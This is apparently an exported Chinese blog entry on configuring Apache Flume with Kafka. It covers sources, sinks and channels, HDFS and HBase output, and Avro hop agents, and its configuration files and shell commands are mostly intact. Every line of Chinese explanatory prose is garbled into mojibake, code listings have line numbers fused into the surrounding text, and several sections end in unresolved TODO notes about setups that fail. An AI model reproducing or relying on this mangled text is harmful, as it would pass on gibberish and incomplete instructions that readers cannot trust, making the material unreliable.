Integer&gt;(); map.put("test2", new Integer(1)); Map&lt;String, List&lt;KafkaStream&lt;byte[], byte[]&gt;&gt;&gt; msgs = Consumer.createJavaConsumerConnector(new ConsumerConfig(props)).createMessageStreams(map); List&lt;KafkaStream&lt;byte[], byte[]&gt;&gt; msgList = msgs.get("test2"); for(KafkaStream&lt;byte[],byte[]&gt; stream : msgList)&#123; ConsumerIterator&lt;byte[],byte[]&gt; it = stream.iterator(); while(it.hasNext())&#123; byte[] message = it.next().message(); System.out.println(new String(message)); &#125; &#125; &#125;&#125; 5.2 æ–°çš„ API6.Flume é›†æˆ kafak6.1KafkaSinkkafka æ˜¯ consumer (æ¶ˆè´¹è€…) flume çš„æ¶ˆæ¯, ç»ç”± kafkaSink å¯¼å‡ºåˆ° kafka â€“æœ€å¸¸ç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273[flume ä¸ºç”Ÿäº§è€…]1.1) flume å‚æ•°é…ç½® ---------------------------------------------------- a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type=netcat a1.sources.r1.bind=localhost a1.sources.r1.port=8888 a1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink a1.sinks.k1.kafka.topic = test3 a1.sinks.k1.kafka.bootstrap.servers = cs2:9092 a1.sinks.k1.kafka.flumeBatchSize = 20 a1.sinks.k1.kafka.producer.acks = 1 a1.channels.c1.type=memory a1.sources.r1.channels = c1 a1.sinks.k1.channel = c11.2) å¼€å¯ kafka æ¶ˆè´¹è€…---------------------------------------------------- kafka-console-consumer.sh --bootstrap-server cs2:9092 --topic test3 --from-beginning æ³¨æ„ : Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper]. ä½¿ç”¨ [bootstrap-server]ä»£æ›¿[zookeeper]1.3) flume æ‰§è¡Œ kafka_sink.conf ---------------------------------------------------- flume-ng agent -f apps/flume/conf/confs/kafka_sink.conf -n a11.4) éªŒè¯ç«¯å£---------------------------------------------------- netstat -anop | grep 8888 [OR] lsof -i tcp:88881.5) nc è¿æ¥---------------------------------------------------- nc localhost 8888 å‘æ¶ˆæ¯....1.6) è§‚å¯Ÿ kafka æ¶ˆè´¹è€…æ¥å—æ¶ˆæ¯---------------------------------------------------- å‘ç°ç‰¹åˆ«å¿«! ========================================================ç®€å•æ¡ˆä¾‹2--------------a1.sources = r1a1.sinks = k1a1.channels = c1a1.sources.r1.type=exec#-F æœ€å10è¡Œ,å¦‚æœä»å¤´å¼€å§‹æ”¶é›† -c +0 -F:æŒç»­æ”¶é›†åç»­æ•°æ®,å¦åˆ™è¿›ç¨‹åœæ­¢ã€‚a1.sources.r1.command=tail -F -c +0 /home/ap/calllog/calllog.loga1.channels.c1.type=memorya1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.topic = callloga1.sinks.k1.kafka.bootstrap.servers = cs2:9092 cs3:9092 cs4:9092# How many messages to process in one batch. Larger batches improve throughput while adding latency.a1.sinks.k1.kafka.flumeBatchSize = 20# How many replicas must acknowledge a message before its considered successfully written. Accepted values are 0 (Never wait for acknowledgement), 1 (wait for leader only), -1 (wait for all replicas) Set this to -1 to avoid data loss in some cases of leader failure.a1.sinks.k1.kafka.producer.acks = 1a1.sources.r1.channels = c1a1.sinks.k1.channel = c1 6.2 KafkaSource :TODOflume source ä» kafka æŠ“æ•°æ®, flume source æ˜¯æ¶ˆè´¹è€…, kafka å¼€å¯ producer. 123456789101112131415161718192021222324252627[æ¶ˆè´¹è€…]1) é…ç½® a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource a1.sources.r1.batchSize = 5000 a1.sources.r1.batchDurationMillis = 2000 a1.sources.r1.kafka.bootstrap.servers = cs2:9092 a1.sources.r1.kafka.topics = test3 a1.sources.r1.kafka.consumer.group.id = g4 a1.sinks.k1.type = logger a1.channels.c1.type=memory a1.sources.r1.channels = c1 a1.sinks.k1.channel = c12) å¯åŠ¨ flume flume-ng agent -f /home/ap/apps/flume/conf/confs/kafka_source.conf -n a1 -Dflume.root.logger=INFO,console3) å¯åŠ¨ kafka producer kafka-console-producer.sh --broker-list cs2:9092 --topic test3 4) kafka å‘æ¶ˆæ¯: æ”¶ä¸åˆ°!!!! :TODO 6.3 KafkaChannel :TODO12345678910111213141516171819202122:TODO ä¹Ÿå‡ºé”™ ?? è¶Šç•Œ ç”Ÿäº§è€… + æ¶ˆè´¹è€… a1.sources = r1 a1.sinks = k1 a1.channels = c1 a1.sources.r1.type = avro a1.sources.r1.bind = localhost a1.sources.r1.port = 8888 a1.sinks.k1.type = logger a1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannel a1.channels.c1.kafka.bootstrap.servers = cs2:9092 a1.channels.c1.kafka.topic = test3 a1.channels.c1.kafka.consumer.group.id = g6 a1.channels.c1.kafka.parseAsFlumeEvent = false a1.channels.c1.zookeeperConnect= cs2:2181 a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Kafka</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flume]]></title>
    <url>%2F2018%2F06%2F30%2FHadoop%2F7-Flume%26Kafka%2FFlume%2F</url>
    <content type="text"><![CDATA[1.Flume æ¦‚å¿µæä¾› æ”¶é›†ã€ç§»åŠ¨ã€èšåˆå¤§é‡æ—¥å¿—æ•°æ®çš„æœåŠ¡ã€‚ åŸºäºæµæ•°æ®çš„æ¶æ„ï¼Œç”¨äºåœ¨çº¿æ—¥å¿—åˆ†æã€‚ åŸºäºäº‹ä»¶ã€‚ åœ¨ç”Ÿäº§å’Œæ¶ˆè´¹è€…ä¹‹é—´å¯åŠ¨åè°ƒä½œç”¨ã€‚ æä¾›äº†äº‹åŠ¡ä¿è¯ï¼Œç¡®ä¿æ¶ˆæ¯ä¸€å®šè¢«åˆ†å‘ã€‚ å¤šç§ Source, Channel, Sinké…ç½®æ–¹å¼ã€‚ ä¸ Sqoop åŒºåˆ« Sqoop ç”¨æ¥é‡‡é›†å…³ç³»å‹æ•°æ®åº“æ•°æ® Flume ç”¨ æ¥é‡‡é›†æµåŠ¨å‹æ•°æ®ã€‚ å…³é”®è¯è§£é‡Š Client Client æ˜¯ä¸€ä¸ªå°†åŸå§‹ log åŒ…è£…æˆ events å¹¶ä¸”å‘é€ä»–ä»¬åˆ°ä¸€ä¸ªæˆ–å¤šä¸ª agent çš„å®ä½“, äº¤ç»™ source å¤„ç† Event Event ç”±å¯é€‰çš„ header å’Œè½½æœ‰æ•°æ®çš„ä¸€ä¸ª byte array æ„æˆã€‚ Source æ¥å—æ•°æ®ï¼Œç±»å‹æœ‰å¤šç§ã€‚ Channel ä¸´æ—¶å­˜æ”¾åœ°ï¼Œå¯¹Sourceä¸­æ¥çš„æ•°æ®è¿›è¡Œç¼“å†²ï¼Œç›´åˆ°sinkæ¶ˆè´¹æ‰ã€‚ Sink ä»channelæå–æ•°æ®å­˜æ”¾åˆ°ä¸­å¤®åŒ–å­˜å‚¨(hadoop / hbase)ã€‚ Iterator ä½œç”¨äº Sourceï¼ŒæŒ‰ç…§é¢„è®¾çš„é¡ºåºåœ¨å¿…è¦åœ°æ–¹è£…é¥°å’Œè¿‡æ»¤ events Channel Selector å…è®¸ Source åŸºäºé¢„è®¾çš„æ ‡å‡†ï¼Œä»æ‰€æœ‰ channel ä¸­ï¼Œé€‰æ‹©ä¸€ä¸ªæˆ–è€…å¤šä¸ª channel A simple Flume agent with one source, channel, and sink Source ==&gt;Channel Channel Flume çš„æ•°æ®æµç”±äº‹ä»¶(Event)è´¯ç©¿å§‹ç»ˆã€‚äº‹ä»¶æ˜¯ Flume çš„åŸºæœ¬æ•°æ®å•ä½ï¼Œå®ƒæºå¸¦æ—¥å¿—æ•°æ®(å­— èŠ‚æ•°ç»„å½¢å¼)å¹¶ä¸”æºå¸¦æœ‰å¤´ä¿¡æ¯ï¼Œè¿™äº› Event ç”± Agent å¤–éƒ¨çš„ Source ç”Ÿæˆï¼Œå½“ Source æ•è·äº‹ ä»¶åä¼šè¿›è¡Œç‰¹å®šçš„æ ¼å¼åŒ–ï¼Œç„¶å Source ä¼šæŠŠäº‹ä»¶æ¨å…¥(å•ä¸ªæˆ–å¤šä¸ª)Channel ä¸­ã€‚ä½ å¯ä»¥æŠŠ Channel çœ‹ä½œæ˜¯ä¸€ä¸ªç¼“å†²åŒºï¼Œå®ƒå°†ä¿å­˜äº‹ä»¶ç›´åˆ° Sink å¤„ç†å®Œè¯¥äº‹ä»¶ã€‚Sink è´Ÿè´£æŒä¹…åŒ–æ—¥å¿—æˆ– è€…æŠŠäº‹ä»¶æ¨å‘å¦ä¸€ä¸ª Sourceã€‚ Flume ä»¥ agent ä¸ºæœ€å°çš„ç‹¬ç«‹è¿è¡Œå•ä½ã€‚ä¸€ä¸ª agent å°±æ˜¯ä¸€ä¸ª JVMã€‚å• agent ç”± Sourceã€Sink å’Œ Channel ä¸‰å¤§ç»„ä»¶æ„æˆï¼Œå¦‚ä¸‹å›¾: å‚è€ƒæ–‡æ¡£ 2.å®‰è£… Flume1.ä¸‹è½½2.tar3.ç¯å¢ƒå˜é‡æ³¨æ„: é…ç½®çš„è¯, ä½¿ç”¨è„šæœ¬å°±æ–¹ä¾¿äº›, ä½†æ˜¯å¦‚æœé…ç½®æ–‡ä»¶åœ¨ flume æ–‡ä»¶å¤¹ä¸­, è·¯å¾„å°±æ¯”è¾ƒé•¿ â€‹ ä¸é…ç½®çš„è¯, è¦è¿›å…¥åˆ°flume è·¯å¾„ä¸‹ä½¿ç”¨, ä½†æ˜¯æ­¤æ—¶é…ç½®æ–‡ä»¶çš„è·¯å¾„å°±æ¯”è¾ƒçŸ­äº† PS: å¦‚æœ.shæ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™, å³xæƒé™, è¦ç”¨ç›¸å¯¹è·¯å¾„æ¥å¯åŠ¨, å³å¦‚æœåœ¨ bin ç›®å½•, è¦ç”¨./flume-ng, åœ¨ bin å¤–,è¦ç”¨ bin/flumeæ‰§è¡Œ, æœ‰xæƒé™çš„è¯, å°±å¯ä»¥ç›´æ¥åœ¨ bin ä¸‹, ä½¿ç”¨ flume-ng, å¦‚æœé…ç½®äº†ç¯å¢ƒå˜é‡, å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹ä½¿ç”¨ flume-ngäº†. Open flume-env.sh file and set the JAVA_Home to the folder where Java was installed in your system. 1export JAVA_HOME=/usr/local/jdk1.8.0_73 In the .zshrc file, set FLUME_HOME 12345#flumeexport FLUME_HOME=/home/ap/apps/flumeexport PATH=$PATH:$FLUME_HOME/bin---source .zshrc 4.éªŒè¯` $&gt; flume-ng version` //next generation.ä¸‹ä¸€ä»£. 3.é…ç½®flumeå‡†å¤‡å·¥ä½œ3.0å¦‚æœ yum æ²¡æœ‰è®¾ç½®ç½‘ç»œæºçš„, è®¾ç½®ä¸€ä¸‹ é˜¿é‡Œ | ç½‘æ˜“123456789101112# å…ˆå¤‡ä»½åŸæ¥çš„ CentOS-Base.repo ä¸º CentOS-Base.repo.bakmv CentOS-Base.repo CentOS-Base.repo.bak# ä¸‹è½½é˜¿é‡ŒåŸºæœ¬æº $&gt;sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo# ä¸‹è½½é˜¿é‡Œepelæº$&gt;sudo wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo# ç”Ÿæˆç¼“å­˜æ–‡ä»¶$&gt;sudo yum clean all$&gt;sudo yum makecache 3.1 æ‰€æœ‰æœºå™¨å®‰è£… nc æˆ–è€… telnet123$&gt;yum search nc$&gt; xcall.sh sudo yum install -y nc.x86_64$&gt; xcall.sh sudo yum install -y telnet 3.2 ä½¿ç”¨ nc123456789101112cs1_1&gt; nc -lk 8888 : å¼€å¯8888ç«¯å£ç›‘å¬-------å†å¼€ä¸€ä¸ªcs1 sessioncs1_2&gt; netstat -anop | grep 8888 : æŸ¥çœ‹æ˜¯æœ‰æœ‰æ­¤ç«¯å£æˆ–è€… &gt; lsof -i tcp:8888 : å¯ä»¥ç›´æ¥çœ‹åˆ° pidtcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN 17251/nc off (0.00/0/0)---------æœ‰çš„è¯å°±å¯ä»¥æµ‹è¯•è¿æ¥äº† (å®¢æˆ·ç«¯è¿æ¥)cs1_2&gt; nc localhost 8888 ==================telnet ä½¿ç”¨æ–¹å¼ç±»ä¼¼, å¯æŸ¥çœ‹å¸®åŠ© 4. flumeé…ç½®å®˜æ–¹æ–‡æ¡£ æ€»ä½“æ¦‚è¿° å®æ—¶å¤„ç†æ¶æ„flume: ç›‘æ§æ—¥å¿—æ–‡ä»¶ æ¯æ¬¡äº§ç”Ÿä¸€æ¡æ–°çš„æ•°æ®, ä¼šè¢«å®æ—¶çš„æ”¶é›†åˆ°ä¸‹ä¸€è·³ Kafka: æ¶ˆæ¯ç³»ç»Ÿ å¯¹æ¶ˆæ¯è¿›è¡Œç®€å•å¤„ç†, å½“ç„¶, å…·æœ‰ç®€å•ç¼“å†²ä½œç”¨ Storm / SparkStreaming: æµå¼çš„åˆ†å¸ƒå¼è®¡ç®—å¼•æ“ Redis: ç¼“å­˜ç»„ä»¶ å†…å­˜æ•°æ®åº“ Hbase / HDFS /ES â€¦: æœ€åæŒä¹…åŒ–åˆ°è¿™äº›åœ°æ–¹.. 4.1 Flume Sourceæ³¨æ„: å¯åŠ¨ flume é…ç½®çš„æ—¶å€™, åé¢åŠ ä¸Š -Dflume.root.logger=INFO,console è¿˜æœ‰ä¸€ç§æ›´è¯¦ç»†çš„ : -Dflume.root.logger=DEBUG,console ä¼šæ‰“å°æ›´è¯¦ç»†çš„æ—¥å¿— 4.1.1 netcaté€šè¿‡æ¶ˆæ¯é€šä¿¡çš„æ–¹å¼, è¿›è¡Œé‡‡é›† 1234567891011121314151617181920212223242526272829303132331.åˆ›å»ºé…ç½®æ–‡ä»¶ [/soft/flume/conf/helloworld.conf] #å£°æ˜ä¸‰ç§ç»„ä»¶ a1.sources = r1 a1.channels = c1 a1.sinks = k1 #å®šä¹‰sourceä¿¡æ¯ a1.sources.r1.type=netcat a1.sources.r1.bind=localhost a1.sources.r1.port=8888 #å®šä¹‰sinkä¿¡æ¯ a1.sinks.k1.type=logger #å®šä¹‰channelä¿¡æ¯ a1.channels.c1.type=memory #ç»‘å®šåœ¨ä¸€èµ· ps: æ³¨æ„: ä¸€ä¸ªsource(æº) å¯ä»¥è¾“å‡ºåˆ°å¤šä¸ª channels(é€šé“) ä¸€ä¸ªsink(æ²‰æ¼•)åªèƒ½ä»ä¸€ä¸ª channel(é€šé“)ä¸­è·å–æ•°æ® a1.sources.r1.channels=c1 a1.sinks.k1.channel=c1 2.è¿è¡Œ a)å¯åŠ¨flume agent $&gt; bin/flume-ng agent -f conf/helloworld.conf -n a1 -Dflume.root.logger=INFO,console b)å¯åŠ¨ncçš„å®¢æˆ·ç«¯ $&gt;nc localhost 8888 $nc&gt;hello world c)åœ¨flumeçš„ç»ˆç«¯è¾“å‡ºhello world. 4.1.2 execå®æ—¶æ—¥å¿—æ”¶é›†,å®æ—¶æ”¶é›†æ—¥å¿—ã€‚ æµ‹è¯•: å…ˆå¯åŠ¨ç›‘æ§, å†åˆ›å»ºæ–‡ä»¶, èƒ½å¦ç›‘æ§åˆ° ç»“è®º: å¯ä»¥ç›‘æ§åˆ° 123456789101112131415161718192021222324252627281. é…ç½® # å£°æ˜3ç§ç»„ä»¶ a1.sources=r1 a1.channels=c1 a1.sinks=k1 # å®šä¹‰ source ä¿¡æ¯ a1.sources.r1.type=exec a1.sources.r1.command=tail -F /home/ap/test.txt #æ”¶é›†æœ€åçš„10è¡Œ a1.sources.r1.command=tail -F -c +0 /home/ap/test.txt #ä»ç¬¬0è¡Œå¼€å§‹æ”¶é›† # å®šä¹‰ sink ä¿¡æ¯ a1.sinks.k1.type=logger # å®šä¹‰ channel ä¿¡æ¯ a1.channels.c1.type=memory # ç»‘å®šåœ¨ä¸€èµ· a1.sources.r1.channels=c1 a1.sinks.k1.channel=c12&gt; æ–°å»ºæ–‡ä»¶ test.txt3&gt; å¯åŠ¨ [ap@cs1]~% flume-ng agent -f apps/flume/conf/confs/exec.conf -n a1 -Dflume.root.logger=INFO,console4&gt; ä¿®æ”¹ test.txt æ–‡ä»¶$&gt; echo ddd &gt; test.txt è§‚å¯Ÿ agent æ§åˆ¶å°å˜åŒ– 4.1.3 æ‰¹é‡æ”¶é›†(spool)ç›‘æ§ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé™æ€æ–‡ä»¶ã€‚ æ–‡ä»¶æœ€å¥½æ˜¯ç›´æ¥ä»å¤–éƒ¨ç§»å…¥, æ–‡ä»¶å¤¹å†…æœ€å¥½ä¸è¦åšæ–‡ä»¶ç¼–è¾‘ã€‚ æ”¶é›†å®Œä¹‹åï¼Œä¼šé‡å‘½åæ–‡ä»¶æˆæ–°æ–‡ä»¶ã€‚.compeleted. ä¹‹åå°±ä¸ä¼šå†æ¬¡å¤„ç†è¿™ä¸ªæ–‡ä»¶äº†. åªä¼šç›‘æ§æ–°å¢åŠ çš„æ–‡ä»¶, ä¸ä¼šç›‘æ§åˆ é™¤çš„æœ¬åœ°æ–‡ä»¶. 123456789101112131415161718192021222324252627a) é…ç½® # å£°æ˜3ç§ç»„ä»¶ a1.sources=r1 a1.channels=c1 a1.sinks=k1 # å®šä¹‰ source ä¿¡æ¯ a1.sources.r1.type=spooldir a1.sources.r1.spoolDir=/home/ap/spool a1.sources.r1.fileHeader=true # å®šä¹‰ sink ä¿¡æ¯ a1.sinks.k1.type=logger # å®šä¹‰ channel ä¿¡æ¯ a1.channels.c1.type=memory # ç»‘å®šåœ¨ä¸€èµ· a1.sources.r1.channels=c1 a1.sinks.k1.channel=c1b)åˆ›å»ºç›®å½• $&gt;mkdir ~/spoolc)å¯åŠ¨flumeå¯ä»¥ç›´æ¥å¯åŠ¨ $&gt;flume-ng agent -f apps/flume/conf/confs/spool.conf -n a1 -Dflume.root.logger=INFO,console 4.1.4 åºåˆ—sources (seq)ä¸€ä¸ªç®€å•çš„åºåˆ—ç”Ÿæˆå™¨, å®ƒè¿ç»­ç”Ÿæˆä¸€ä¸ªè®¡æ•°å™¨, å®ƒä»0å¼€å§‹, å¢é‡ä¸º 1, å¹¶åœ¨ totalEvents åœæ­¢ã€‚ ä¸»è¦ç”¨äºæµ‹è¯•ã€‚ 1234567891011121314151617181920212223241) é…ç½®# å£°æ˜3ç§ç»„ä»¶a1.sources=r1a1.channels=c1a1.sinks=k1# å®šä¹‰ source ä¿¡æ¯a1.sources.r1.type=seqa1.sources.r1.totalEvents=1000# å®šä¹‰ sink ä¿¡æ¯a1.sinks.k1.type=logger# å®šä¹‰ channel ä¿¡æ¯a1.channels.c1.type=memory# ç»‘å®šåœ¨ä¸€èµ·a1.sources.r1.channels=c1a1.sinks.k1.channel=c12) è¿è¡Œ$&gt;bin/flume-ng agent -f conf/confs/helloworld.seq.conf -n a1 -Dflume.root.logger=INFO,console 4.1.5 å‹åŠ› source (ç”¨äºå‹åŠ›æµ‹è¯•)123456a1.sources = stresssource-1a1.channels = memoryChannel-1a1.sources.stresssource-1.type = org.apache.flume.source.StressSourcea1.sources.stresssource-1.size = 10240a1.sources.stresssource-1.maxTotalEvents = 1000000a1.sources.stresssource-1.channels = memoryChannel-1 4.1.6 Multiplexing Channel Selector :TODOflume å¤šè·¯å¤ç”¨ å®˜ç½‘ 4.2. Flume Sinkæ²‰æ¼•, source ç»è¿‡ channel, æœ€åä¸‹æ²‰åˆ° sink, å†ç”± sink è¾“å‡º æ³¨æ„, flume åé¢åŠ ä¸Š &amp;æ˜¯æŒ‡åå°è¿è¡Œ å®˜ç½‘ 4.2.1è¾“å‡º (sink) åˆ° HDFS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384851) é…ç½®===================================================================a1.sources = r1a1.channels = c1a1.sinks = k1a1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 8888a1.sinks.k1.type = hdfsa1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/%M/%Sa1.sinks.k1.hdfs.filePrefix = events-# roundç›®å½• æ˜¯å¦ä¼šäº§ç”Ÿæ–°ç›®å½•,æ¯ååˆ†é’Ÿäº§ç”Ÿä¸€ä¸ªæ–°ç›®å½•,ä¸€èˆ¬æ§åˆ¶çš„ç›®å½•æ–¹é¢ã€‚#2017-12-12 --&gt;#2017-12-12 --&gt;%H%M%Sæ¯”å¦‚ å†™ä¸Š 1 / day, å°±æ˜¯ä¸€å¤©äº§ç”Ÿçš„æ•°æ®æ–‡ä»¶éƒ½åœ¨ ä¸€ä¸ªæ—¥æœŸçš„ç›®å½•ä¸‹.---a1.sinks.k1.hdfs.round = true a1.sinks.k1.hdfs.roundValue = 1a1.sinks.k1.hdfs.roundUnit = day#ä½¿ç”¨æœ¬åœ°æ—¶é—´æˆ³ä¸ºæ—¶é—´åºåˆ—å¤´ a1.sinks.k1.hdfs.useLocalTimeStamp=true#æ˜¯å¦äº§ç”Ÿæ–°æ–‡ä»¶ã€‚ -------------åªè¦3ä¸ªæ¡ä»¶ä¸­æŸä¸€ä¸ªæ»¡è¶³, å°±ä¼šæ»šåŠ¨ä¸€ä¸ªæ–‡ä»¶# rollæ»šåŠ¨, æ­¤äº‹ä»¶å†…çš„æ—¥å¿—ä¼šå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶# ç›®å‰çš„çŒœæµ‹: 10ä¸ªå­—èŠ‚å°±ä¼šè§¦å‘, å¦‚æœ10ç§’å†… 0 &lt; input &lt; 10å­—èŠ‚, ä¹Ÿä¼šæ»šåŠ¨ =&gt; æ˜¯çš„# ç­‰å¾…æ»šåŠ¨å½“å‰çš„æ–‡ä»¶ 10ç§’,Number of seconds to wait before rolling current file (0 = never roll based on time interval)a1.sinks.k1.hdfs.rollInterval=10 # è¿™æ˜¯æŒ‡10ä¸ªå­—èŠ‚å°±è§¦å‘æ»šåŠ¨ File size to trigger roll, in bytes (0: never roll based on file size) a1.sinks.k1.hdfs.rollSize=10 # Number of events written to file before it rolled (0 = never roll based on number of events) ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªäº‹ä»¶ a1.sinks.k1.hdfs.rollCount=3 a1.channels.c1.type=memorya1.sources.r1.channels = c1a1.sinks.k1.channel = c1-----------------# sinkå…¶å®ƒå¯é€‰é…ç½®å‚æ•°(è¯¦æƒ…å¯æŸ¥å®˜ç½‘)agent1.sinks.sink1.type = hdfs#a1.sinks.k1.channel = c1agent1.sinks.sink1.hdfs.path =hdfs://myha01/weblog/flume-event/%y-%m-%d/%H-%M agent1.sinks.sink1.hdfs.filePrefix = tomcat_agent1.sinks.sink1.hdfs.maxOpenFiles = 5000agent1.sinks.sink1.hdfs.batchSize= 100agent1.sinks.sink1.hdfs.fileType = DataStreamagent1.sinks.sink1.hdfs.writeFormat =Textagent1.sinks.sink1.hdfs.rollSize = 102400agent1.sinks.sink1.hdfs.rollCount = 1000000agent1.sinks.sink1.hdfs.rollInterval = 60agent1.sinks.sink1.hdfs.round = trueagent1.sinks.sink1.hdfs.roundValue = 10agent1.sinks.sink1.hdfs.roundUnit = minuteagent1.sinks.sink1.hdfs.useLocalTimeStamp = true&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;å¦‚æœ HDFS é›†ç¾¤æ˜¯é«˜å¯ç”¨é›†ç¾¤ï¼Œé‚£ä¹ˆå¿…é¡»è¦æ”¾å…¥ core-site.xml å’Œ hdfs-site.xml æ–‡ä»¶åˆ° $FLUME_HOME/conf/confs ç›®å½•ä¸­, å°±æ˜¯è·Ÿé…ç½®æ–‡ä»¶åŒçº§ç›®å½•.&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;2) å¼€å¯agent===================================================================[ap@cs1]~/apps/flume/conf/confs% flume-ng agent -f hdfs.conf -n a13) nc è¿æ¥===================================================================nc local 8888è¿æ¥ä¸Šäº†ä¹‹å, å‘å‡ºå»çš„æ¶ˆæ¯å°±ä¼šå†™å…¥ hdfs 4) å†™å…¥æ—¶, å®Œæ•´çš„ log æ˜¯è¿™æ ·çš„===================================================================18/06/30 18:39:18 INFO hdfs.HDFSSequenceFile: writeFormat = Writable, UseRawLocalFileSystem = false18/06/30 18:39:18 INFO hdfs.BucketWriter: Creating /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp18/06/30 18:39:28 INFO hdfs.BucketWriter: Closing /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp18/06/30 18:39:28 INFO hdfs.BucketWriter: Renaming /user/ap/flume/events/18-06-30/18/39/00/events-.1530355158463.tmp to /user/ap/flume/events/18-06-30/18/39/00/events-.153035515846318/06/30 18:39:28 INFO hdfs.HDFSEventSink: Writer callback called.5) æŸ¥çœ‹ ===================================================================æ³¨æ„: åºåˆ—æ–‡ä»¶ç”¨ text æŸ¥çœ‹ 4.2.2 è¾“å‡ºåˆ° Hiveå†™å…¥å¤ªæ…¢, å› ä¸ºè¦è½¬ä¸º MR, æ‰€ä»¥ä¸€èˆ¬ä¸ä¼šç”¨ 4.2.3 è¾“å‡º (sink) åˆ° HBase123456789101112131415161718192021222324253.1) é…ç½®æ–‡ä»¶===================================================================a1.sources = r1a1.channels = c1a1.sinks = k1a1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 8888a1.sinks.k1.type = hbasea1.sinks.k1.table = ns1:t12a1.sinks.k1.columnFamily = f1a1.sinks.k1.serializer = org.apache.flume.sink.hbase.RegexHbaseEventSerializera1.channels.c1.type=memorya1.sources.r1.channels = c1a1.sinks.k1.channel = c13.2) å¼€å¯ nc è¾“å…¥===================================================================3.3) åœ¨ hbase shell ä¸­ scan è¡¨ 'ns1:t12'=================================================================== 4.2.4 è¾“å‡ºåˆ° kafka:TODO 4.3. Flume Channel4.3.1.Memory Channelä»¥ä¸Šç”¨çš„éƒ½æ˜¯Memory Channel, ä¸å†æ˜¾ç¤º 4.3.2 FileChannel1234567891011121314151617181920212223242526271) é…ç½®===================================================================a1.sources = r1a1.sinks= k1a1.channels = c1a1.sources.r1.type=netcata1.sources.r1.bind=localhosta1.sources.r1.port=8888a1.sinks.k1.type=loggera1.channels.c1.type = filea1.channels.c1.checkpointDir = /home/centos/flume/fc_checka1.channels.c1.dataDirs = /home/centos/flume/fc_dataa1.sources.r1.channels=c1a1.sinks.k1.channel=c12) åˆ›å»ºçš„æ–‡ä»¶å¤§æ¦‚æ˜¯è¿™æ ·===================================================================$~/flumedata&gt; ls -r fc*fc_data:log-1.meta log-1 in_use.lockfc_check:queueset in_use.lock inflighttakes inflightputs checkpoint.meta checkpoint 4.3.3 å¯æº¢å‡ºæ–‡ä»¶é€šé“This channel is currently experimental and not recommended for use in production. 123456789101112[spillable_channel.conf]a1.channels = c1a1.channels.c1.type = SPILLABLEMEMORY#0è¡¨ç¤ºç¦ç”¨å†…å­˜é€šé“ï¼Œç­‰ä»·äºæ–‡ä»¶é€šé“a1.channels.c1.memoryCapacity = 0#0,ç¦ç”¨æ–‡ä»¶é€šé“ï¼Œç­‰ä»·å†…å­˜é€šé“ã€‚a1.channels.c1.overflowCapacity = 2000a1.channels.c1.byteCapacity = 800000a1.channels.c1.checkpointDir = /user/centos/flume/fc_checka1.channels.c1.dataDirs = /user/centos/flume/fc_data 4.4 ä½¿ç”¨AvroSourceå’ŒAvroSinkå®ç°è·ƒç‚¹agentå¤„ç† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869 [avro_hop.conf]############ ï£¿a1ï£¿ ############# å£°æ˜3ç§ç»„ä»¶a1.sources=r1a1.channels=c1a1.sinks=k1# å®šä¹‰ source ä¿¡æ¯a1.sources.r1.type=netcata1.sources.r1.bind=localhosta1.sources.r1.port=8888# å®šä¹‰ sink ä¿¡æ¯a1.sinks.k1.type=avroa1.sinks.k1.hostname=localhosta1.sinks.k1.port=9999# å®šä¹‰ channel ä¿¡æ¯a1.channels.c1.type=memory# ç»‘å®šåœ¨ä¸€èµ·a1.sources.r1.channels=c1a1.sinks.k1.channel=c1############ ï£¿a2ï£¿ ############# å£°æ˜3ç§ç»„ä»¶a2.sources=r2a2.channels=c2a2.sinks=k2# å®šä¹‰ source ä¿¡æ¯# source æ˜¯ avro, ç»‘å®šç«¯å£9999a2.sources.r2.type=avroa2.sources.r2.bind=localhosta2.sources.r2.port=9999# å®šä¹‰ sink ä¿¡æ¯# sink æ‰“å°åˆ°æ§åˆ¶å°a2.sinks.k2.type=logger# å®šä¹‰ channel ä¿¡æ¯a2.channels.c2.type=memory# ç»‘å®šåœ¨ä¸€èµ·a2.sources.r2.channels=c2a2.sinks.k2.channel=c22.å¯åŠ¨a2===================================================================$&gt;flume-ng agent -f /soft/flume/conf/avro_hop.conf -n a2 -Dflume.root.logger=INFO,console3.éªŒè¯a2===================================================================$&gt;netstat -anop | grep 99994.å¯åŠ¨a1===================================================================$&gt;flume-ng agent -f /soft/flume/conf/avro_hop.conf -n a15.éªŒè¯a1===================================================================$&gt;netstat -anop | grep 88886.nc è¿æ¥a1 &amp; 